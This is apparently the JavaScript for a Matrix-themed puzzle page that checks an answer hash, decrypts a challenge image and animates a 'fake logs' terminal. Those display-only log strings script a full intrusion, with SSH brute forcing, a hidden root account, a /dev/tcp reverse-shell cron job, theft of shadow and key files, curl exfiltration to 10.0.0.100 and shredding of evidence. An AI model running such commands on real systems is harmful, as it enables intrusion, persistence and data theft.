// Audio Control
let audioPlaying = false;
const audio = new Audio('mixkit-games-music-706.mp3');

function toggleAudio() {
  const audioControlButton = document.querySelector('.audio-control button i');
  if (audioPlaying) {
    audio.pause();
    audioControlButton.classList.remove('fa-pause');
    audioControlButton.classList.add('fa-play');
  } else {
    audio.play();
    audioControlButton.classList.remove('fa-play');
    audioControlButton.classList.add('fa-pause');
  }
  audioPlaying = !audioPlaying;
}

// Decrypt Image and Check Answer
async function submitAnswer() {
  const answer = document.getElementById('answer').value.trim();
  const storedHash = '9251f129e36d22db1b07c86a83bc9268948d98bd80be3b9c6eb8c48ed0ef22ac';
  
  // Hash the user's input
  const answerHash = await crypto.subtle.digest(
    'SHA-256',
    new TextEncoder().encode(answer)
  );
  const hexHash = Array.from(new Uint8Array(answerHash))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');

  if (hexHash === storedHash) {
    decryptImage(answer, 'http://localhost:8080/images/challenge2.png.enc');
  } else {
    alert('Incorrect answer! Try again.');
  }
}

// Decrypt Image Function
async function decryptImage(password, imagePath) {
try {
    // Fetch the encrypted image data
    const response = await fetch(imagePath);
    const encryptedBase64 = await response.text(); // Assuming the encrypted data is Base64 encoded
    const encryptedBlob = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));

    // Extract the IV and encrypted content
    const iv = encryptedBlob.slice(0, 16); // First 16 bytes are the IV
    const encryptedContent = encryptedBlob.slice(16); // Remaining bytes are the encrypted data

    // Derive the cryptographic key from the password
    const passwordKey = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(password)); // SHA-256 hash of the password
    const key = await crypto.subtle.importKey(
        "raw",
        passwordKey,
        { name: "AES-CBC" },
        false,
        ["decrypt"]
    );

    // Decrypt the data
    const decryptedData = await crypto.subtle.decrypt(
    { name: "AES-CBC", iv: iv },
    key,
    encryptedContent
    );

    // Remove PKCS#7 padding
    const decryptedArray = new Uint8Array(decryptedData);
    const paddingLength = decryptedArray[decryptedArray.length - 1];
    const unpaddedData = decryptedArray.slice(0, decryptedArray.length - paddingLength);

    // Convert decrypted data to Base64 and display the image
    const base64Image = btoa(
    String.fromCharCode(...unpaddedData)
    );
    document.getElementById('challenge-image').src = 'data:image/png;base64,' + base64Image;
} catch (err) {
    alert('Error decrypting the image. Make sure your answer is correct.');
    console.error(err);
}
}
  

// Matrix Effect
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');

// Resize canvas to fit the window
function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}

resizeCanvas();
window.addEventListener('resize', resizeCanvas);

const fontSize = 16; // Size of each character
const columns = Math.floor(canvas.width / fontSize); // Number of columns
const drops = Array(columns).fill(0); // Array to track Y position for each column

function drawMatrix() {
  // Clear the canvas with a transparent black overlay
  ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Set text properties
  ctx.fillStyle = '#0f0'; // Green text
  ctx.font = `${fontSize}px monospace`;

  for (let i = 0; i < drops.length; i++) {
    // Generate a random character from Katakana Unicode range
    const text = String.fromCharCode(0x30A0 + Math.random() * 96);

    // Draw the character at the current position
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);

    // Move the character down the screen
    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
      // Reset the drop to the top randomly
      drops[i] = 0;
    }
    drops[i]++;
  }
}

// Animate the matrix effect
setInterval(drawMatrix, 50);

function showWhiteRabbit() {
    const rabbit = document.getElementById('white-rabbit');
    const container = document.getElementById('rabbit-container');
  
    // Generate random position within the container
    const randomX = Math.random() * (window.innerWidth - 50); // Ensure the rabbit stays within screen bounds
    const randomY = Math.random() * (window.innerHeight - 50);
  
    // Position the rabbit
    rabbit.style.left = `${randomX}px`;
    rabbit.style.top = `${randomY}px`;
  
    // Fade in the rabbit
    rabbit.style.opacity = 1;
  
    // Fade out after a delay
    setTimeout(() => {
      rabbit.style.opacity = 0;
    }, 4000); // Rabbit stays visible for 2 seconds
  }
  
  // Repeatedly show the rabbit at random intervals
  setInterval(() => {
    showWhiteRabbit();
  }, 60000); // Adjust interval (5000ms = 5 seconds)
  
  function populatePanels() {
    const systemInfo = document.getElementById('system-info');
    const networkInfo = document.getElementById('network-info');
  
    // **System Information**
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
  
    systemInfo.innerHTML = `
      <li><strong>Platform:</strong> ${platform}</li>
      <li><strong>User Agent:</strong> ${userAgent}</li>
      <li><strong>Language:</strong> ${language}</li>
      <li><strong>Screen:</strong> ${screenWidth} x ${screenHeight}</li>
    `;  
    // **Geolocation**
    navigator.geolocation.getCurrentPosition(position => {
      const { latitude, longitude } = position.coords;
      systemInfo.innerHTML += `
        <li><strong>Latitude:</strong> ${latitude.toFixed(4)}</li>
        <li><strong>Longitude:</strong> ${longitude.toFixed(4)}</li>
      `;
    });
  
    // **Fake CPU Usage**
    setInterval(() => {
      const cpuUsage = (Math.random() * 100).toFixed(1);
      const existingCpu = document.getElementById('cpu-usage');
      if (existingCpu) existingCpu.innerHTML = `<strong>CPU:</strong> ${cpuUsage}%`;
      else {
        const cpuElement = document.createElement('li');
        cpuElement.id = 'cpu-usage';
        cpuElement.innerHTML = `<strong>CPU:</strong> ${cpuUsage}%`;
        systemInfo.appendChild(cpuElement);
      }
    }, 2000);
  }
  
  // Run the function
  populatePanels();
  
  const logs = ['www-data@webserver:/var/www/html$ nmap -sS -Pn -T4 -p- 10.0.0.5',
`
  Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-12 18:23 UTC
  Nmap scan report for 10.0.0.5
  Host is up (0.0015s latency).
  Not shown: 65532 closed ports
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  3306/tcp open  mysql
  
  Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds
    `,
  'www-data@webserver:/var/www/html$ gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
    `
  ===============================================================
  Gobuster v3.1.0
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@FireFart)
  /admin (Status: 200)
  /login (Status: 200)
  /uploads (Status: 200)
  /backup (Status: 403)
  /private (Status: 403)
  ===============================================================
    `,
  'www-data@webserver:/var/www/html$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5',
    `
  Hydra v9.3-dev (c) 2024 by van Hauser/THC & David Maciejak
  [DATA] attacking ssh://10.0.0.5:22/
  [22][ssh] host: 10.0.0.5   login: admin   password: SecurePass123!
  [STATUS] attack finished for 10.0.0.5 (valid pair found)
    `,
  'www-data@webserver:/var/www/html$ ssh admin@10.0.0.5',
    `
  Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
  appuser@app-server:/home/appuser$
    `,
  'appuser@app-server:/home/appuser$ sudo -l',
    `
  User appuser may run the following commands on app-server:
      (ALL) NOPASSWD: /usr/bin/vuln_suid
    `,
  'appuser@app-server:/home/appuser$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh',
    `
  --2024-11-12 18:30:01--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
  Resolving github.com (github.com)... 140.82.121.4
  Connecting to github.com (github.com)|140.82.121.4|:443... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 1244563 (1.2M) [text/plain]
  Saving to: ‘/tmp/linpeas.sh’
  
  /tmp/linpeas.sh     100%[=====================>]   1.19M  10.5MB/s    in 0.1s    
  
  2024-11-12 18:30:01 (10.5 MB/s) - ‘/tmp/linpeas.sh’ saved [1244563/1244563]
    `,
  'appuser@app-server:/home/appuser$ chmod +x /tmp/linpeas.sh',
  '',
  'appuser@app-server:/home/appuser$ ./linpeas.sh | tee /tmp/linpeas_output.txt',
    `
  Hostname: app-server
  Kernel: 5.15.0-78-generic x86_64
  OS: Ubuntu 22.04.3 LTS
  User ID: 1002(appuser)
  [+] SUID binaries:
      /usr/bin/vuln_suid
    `,
  'appuser@app-server:/home/appuser$ /usr/bin/vuln_suid',
    `
  # id
  uid=0(root) gid=0(root) groups=0(root)
    `,
  'root@app-server:/root$ useradd -ou 0 -g 0 -M -r -s /bin/bash backupsvc',
  '',
  'root@app-server:/root$ echo "backupsvc:RootAccess2024!" | chpasswd',
  '',
  'root@app-server:/root$ echo "* * * * * bash -i >& /dev/tcp/10.0.0.100/4444 0>&1" | tee -a /etc/crontab',
  '',
  'root@app-server:/root$ cat /etc/shadow',
    `
  root:$6$h7WE...S6$9B6xx...EncryptedHash:18775:0:99999:7:::
  appuser:$6$FgP3...Y7$3Z8xy...EncryptedHash:18775:0:99999:7:::
    `,
  'root@app-server:/root$ cat /root/.ssh/id_rsa',
    `
  -----BEGIN RSA PRIVATE KEY-----
  MIIEpQIBAAKCAQEA7G12q0...
  -----END RSA PRIVATE KEY-----
    `,
  'root@app-server:/root$ scp -i /tmp/root_key /tmp/linpeas_output.txt root@10.0.0.6:/tmp/',
    `
  linpeas_output.txt 100% |********************************|   14.5kB   0:00:00
    `,
  'root@app-server:/root$ ssh -i /tmp/root_key root@10.0.0.6',
    `
  Welcome to CentOS Stream release 9 (Core)
  dbadmin@db-server:/var/lib/mysql$
    `,
  'dbadmin@db-server:/var/lib/mysql$ tar -czf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow /root/.ssh',
  '',
  'dbadmin@db-server:/var/lib/mysql$ openssl enc -aes-256-cbc -salt -in /tmp/sensitive_data.tar.gz -out /tmp/data.enc -k SuperSecretKey',
  '',
  'dbadmin@db-server:/var/lib/mysql$ curl -X POST -F "file=@/tmp/data.enc" http://10.0.0.100/upload',
    `
  100  130k    0  130k    0     0  2012k      0 --:--:-- --:--:-- --:--:-- 2012k
  Upload complete.
    `,
  'dbadmin@db-server:/var/lib/mysql$ shred -u /tmp/sensitive_data.tar.gz /tmp/data.enc /tmp/linpeas.sh /tmp/root_key',
  '',
  'dbadmin@db-server:/var/lib/mysql$ exit',
  ''
  ];      
  
  let currentLogIndex = 0;

  function generateFakeLogs() {
    const networkInfo = document.getElementById('network-info');
  
    if (currentLogIndex < logs.length) {
      const logEntry = logs[currentLogIndex];
      const logElement = document.createElement('li');
      networkInfo.appendChild(logElement);
  
      // Separate the user@hostname and the command
      const [prefix, ...commandParts] = logEntry.split('$ ');
      const command = commandParts.join('$ '); // Handles cases where '$' appears in the command
  
      // Display user@hostname instantly and type the command
      if (command) {
        logElement.innerHTML = `<span class="prefix">${prefix}$ </span><span class="command"></span>`;
        const commandElement = logElement.querySelector('.command');
        simulateTyping(command, commandElement, () => {
          autoScroll(networkInfo); // Auto-scroll after typing
          processNextLog();
        });
      } else {
        logElement.textContent = logEntry; // For outputs or non-typed logs
        autoScroll(networkInfo); // Auto-scroll for immediate display
        processNextLog();
      }
    } else {
      // Restart logs after a delay
      currentLogIndex = 0;
      setTimeout(generateFakeLogs, 8000); // Delay before restarting logs
    }
  }
  
  function simulateTyping(text, logElement, callback) {
    let i = 0;
    logElement.textContent = ''; // Clear existing content
  
    function typeNextCharacter() {
      if (i < text.length) {
        logElement.textContent += text.charAt(i); // Add one character at a time
        i++;
        const typingSpeed = 100 + Math.random() * 50; // Randomized speed
        setTimeout(typeNextCharacter, typingSpeed);
      } else {
        callback(); // Trigger the callback after typing finishes
      }
    }
  
    typeNextCharacter();
  }
  
  function autoScroll(container) {
    container.scrollTop = container.scrollHeight; // Scroll to the bottom of the container
  }
  
  function processNextLog() {
    currentLogIndex++;
    setTimeout(generateFakeLogs, 3000); // Add delay between logs
  }
  
  // Start generating logs
  generateFakeLogs();
  
  